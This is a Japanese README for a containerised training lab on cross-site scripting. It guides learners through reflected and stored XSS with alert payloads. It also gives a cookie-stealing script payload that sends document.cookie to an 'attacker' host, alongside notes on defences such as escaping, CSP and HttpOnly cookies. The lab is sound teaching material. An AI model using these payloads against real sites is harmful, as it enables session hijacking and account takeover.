# Lumos Security Lab — Stage 1: XSS 基礎

隔離したコンテナ環境で **XSS（クロスサイトスクリプティング）** を学ぶ演習です。
`alert()` を実行して脆弱性を体感し、最終的に管理者セッション cookie の窃取まで理解します。

> ⚠️ **教育・演習専用**。意図的に脆弱なアプリです。公開サーバで起動しないでください。
> 攻撃は本リポジトリの `victim` コンテナに対してのみ行ってください。

## 構成

| コンテナ | 役割 | アクセス |
|----------|------|----------|
| `victim` | 脆弱なWebアプリ | ブラウザ: http://localhost:8080 |
| `attacker` | 作業用ツール箱 | `docker compose exec attacker bash` |

両コンテナは `labnet` で接続。attacker からは `http://victim:3000` で到達できます。

## セットアップ（当日）

```bash
git clone <このリポジトリのURL>
cd lumos-security-lab
docker compose up --build        # 起動（-d でバックグラウンド）
```

- ブラウザで **http://localhost:8080** を開く
- 攻撃者端末に入る: `docker compose exec attacker bash`
- 片付け: `docker compose down`

## 課題

### 課題1: Reflected XSS
検索ボックスの入力がそのままHTMLに反映されます。

1. http://localhost:8080/search を開く
2. 次を入力して検索（または URL の `?q=` に直接入れる）
   ```
   <script>alert(1)</script>
   ```
3. popup が出れば成功。次に `alert(document.cookie)` で cookie を表示。

### 課題2: Stored XSS
投稿内容が保存され、ページを開いた**全員**のブラウザで実行されます。

1. http://localhost:8080/guestbook を開く
2. コメント欄に payload を投稿
   ```
   <script>alert(document.cookie)</script>
   ```
3. ページを再読込した人全員に popup が出る（＝影響範囲が広い）

### 発展: cookie 窃取
attacker 側で catcher を起動し、cookie を外部に送信する payload を考える。

```bash
# attacker コンテナ内
python3 catcher.py
```
payload 例:
```html
<script>new Image().src='http://attacker:8000/?c='+document.cookie</script>
```
※ホストのブラウザからは `attacker` 名前解決ができないため、
同一ネットワーク内の headless ブラウザで試す形になります（Stage2で扱う想定）。

## 学習ポイント

- Reflected と Stored の違い（影響範囲・持続性）
- `alert()` は「任意のJSが動く」ことの最小の証明。実害は cookie 窃取・なりすまし等
- 対策: 出力時のエスケープ（contextに応じた）、CSP、HttpOnly cookie
